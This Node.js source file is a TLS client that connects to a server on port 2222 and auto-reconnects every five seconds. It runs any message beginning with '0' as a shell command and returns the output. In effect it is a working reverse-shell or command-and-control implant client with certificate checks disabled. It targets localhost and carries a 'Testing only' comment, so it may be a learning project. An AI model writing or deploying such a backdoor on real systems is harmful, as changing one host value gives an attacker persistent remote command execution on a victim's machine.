const tls = require('tls')
const  fs = require('fs')
const { exec } = require('child_process');

/**
 * options object stores the private key and public cert to be used by tls socket for traffic encryption.
 */
const options = {
    key: fs.readFileSync('client-cert/private-key.pem'),
    cert: fs.readFileSync('client-cert/public-cert.pem'),
    rejectUnauthorized: false
}

// flag variable to let the client know if it needs to reconnect to the server
let reconnect = false;

/**
 * Anon function that connects to server over TLS and assigns to client. if it notices that the client
 * has disconnected from the server it will attempt to reconnect.
 */
const serverConnect = () => {
    const client = tls.connect(2222,'127.0.0.1', options)

    // once TLS handshake is completed let client know - Testing only
    client.on('secure', () => {
        stopReconnect()
        console.log('Connected!')
    })

    /**
     * Data from server is broken up into few parts:
     * if the first character is 0 : execute as a shell command
     * if the first character is 1 : write to console 
     */
    client.on('data', (data) => {
        msg = data.toString()
    
        switch (msg[0]) {
            case '0':
                exec(msg.substr(1), (err, stdout, stderr) => {
                    if (err) {
                        client.write(`error: ${err.message}`);
                        return;
                    }
                    if (stderr) {
                        client.write(`stderr: ${stderr}`);
                        return;
                    }
                    client.write(stdout);
                })
                break
            case '1':
                console.log('Server: ' + msg.substr(1))
                break
        }
    })
    
    // if the socket disconnects, destroy the socket, and attempt to reconnect with a new socket
    client.on('close', () => {
        console.log('Connection closed...attempting reconnection...')
        client.destroy()
        attemptReconnect()
    })
    
    // if the socket throws an error, destroy the socket, and attempt to reconnect with new socket
    client.on('error', (error) => {
        console.log(error)
        client.destroy()
        attemptReconnect()
    })
}

// Attempt to reconnect socket every 5000 ms
const attemptReconnect = () => {
    if (reconnect != false) return
    reconnect = setInterval(serverConnect, 5000)
}

// stop reconnecting and set reconnect flag to false
const stopReconnect = () => {
    if (reconnect == false) return
    clearInterval(reconnect)
    reconnect = false
}

// Run function on first execution to create connection
serverConnect()